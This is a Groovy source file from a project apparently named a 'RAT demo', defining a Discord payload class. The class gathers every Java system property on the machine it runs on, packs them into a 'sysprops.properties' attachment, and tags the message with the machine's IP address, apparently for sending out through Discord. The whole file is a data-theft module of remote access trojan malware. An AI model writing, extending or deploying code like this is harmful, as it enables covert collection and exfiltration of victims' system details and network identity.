package de.tudbut.ttd.ratdemo.discord.impl


import de.tudbut.ttd.ratdemo.Util
import de.tudbut.ttd.ratdemo.discord.DiscordPayload
import tudbut.parsing.TCN

class DPropertiesPayload implements DiscordPayload {

    @Override
    String getAttachmentName() {
        return 'sysprops.properties'
    }

    @Override
    byte[] getAttachment() {
        Properties properties = System.getProperties()
        ByteArrayOutputStream baos = new ByteArrayOutputStream()
        properties.store(baos, 'Properties')
        baos.close()
        return baos.toByteArray()
    }

    @Override
    TCN getContent() {
        TCN content = new TCN()
        content.set('username', Util.IP)
        content.set('content', 'Properties')
        return content
    }
}
